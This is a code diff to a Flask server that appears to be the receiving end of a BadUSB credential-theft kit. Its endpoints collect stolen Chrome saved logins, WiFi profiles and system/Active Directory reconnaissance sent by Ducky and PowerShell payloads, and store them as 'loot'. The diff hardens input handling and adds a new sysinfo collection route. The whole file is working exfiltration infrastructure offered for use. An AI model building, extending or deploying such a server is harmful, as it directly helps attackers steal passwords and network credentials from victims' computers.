@@ -3,9 +3,15 @@
 
 from flask import Flask, request, send_file
 from pathlib import Path
-import base64, binascii, json, os
+import base64, binascii, json, os, re
 
 app = Flask(__name__)
+app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024  # 50 MB upload cap
+
+
+def _safe_name(value: str, maxlen: int = 64) -> str:
+    """Strip path components and allow only alphanumeric, underscore, hyphen."""
+    return re.sub(r"[^a-zA-Z0-9_-]", "_", Path(value).name)[:maxlen] or "unk"
 
 
 def _loot_base() -> Path:
@@ -25,8 +31,8 @@ PAYLOADS = Path(__file__).parent.parent / "payloads"
 @app.route("/upload", methods=["POST"])
 def upload_chrome():
     """Receive base64-encoded Chrome Login Data from browser_exfil.ducky."""
-    host = request.form.get("host", "unk")
-    user = request.form.get("user", "unk")
+    host = _safe_name(request.form.get("host", "unk"))
+    user = _safe_name(request.form.get("user", "unk"))
     raw  = request.form.get("data", "")
     if not raw:
         return "missing data", 400
@@ -44,12 +50,32 @@ def upload_chrome():
 @app.route("/wifi", methods=["POST"])
 def upload_wifi():
     """Receive WiFi profile dump from wifi_steal.ducky."""
-    host = request.form.get("h", "unk")
+    host = _safe_name(request.form.get("h", "unk"))
     data = request.form.get("d", "")
+    if not data:
+        return "missing data", 400
     dest = LOOT / "creds" / f"{host}_wifi.txt"
     dest.parent.mkdir(parents=True, exist_ok=True)
     dest.write_text(data, encoding="utf-8")
     print(f"[+] WiFi profiles from {host} → {dest}")
+    return "OK"
+
+
+@app.route("/sysinfo", methods=["POST"])
+def upload_sysinfo():
+    """Receive base64-encoded JSON sysinfo blob from sysinfo.ps1 / ad_recon.ps1."""
+    host = _safe_name(request.form.get("host", "unk"))
+    raw  = request.form.get("data", "")
+    if not raw:
+        return "missing data", 400
+    try:
+        data = base64.b64decode(raw).decode("utf-8", errors="replace")
+    except (binascii.Error, ValueError):
+        return "invalid base64", 400
+    dest = LOOT / "creds" / f"{host}_sysinfo.json"
+    dest.parent.mkdir(parents=True, exist_ok=True)
+    dest.write_text(data, encoding="utf-8")
+    print(f"[+] Sysinfo from {host} → {dest}")
     return "OK"
 
 
